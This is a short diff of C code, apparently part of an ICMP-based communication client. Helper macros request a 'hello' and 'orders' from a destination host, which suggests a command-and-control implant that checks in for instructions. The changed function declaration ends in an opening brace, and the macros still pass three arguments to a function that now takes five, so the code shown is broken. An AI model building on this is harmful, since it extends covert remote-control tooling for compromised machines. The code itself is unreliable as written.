@@ -3,7 +3,7 @@
 #include "include/requests.h"
 
 // ICMP
-INT SendICMP(LPSTR destination, REQUEST_TYPE request_type);
+INT SendICMP(LPSTR destination, INT datasize, REQUEST_TYPE request_type, RESPONSE_TYPE* response_type, LPSTR payload) {
 
 #define SendICMP_GetHello(destination) SendICMP(destination, 32, GET_HELLO);
 #define SendICMP_GetOrders(destination) SendICMP(destination, 32, GET_INSTRUCTION);
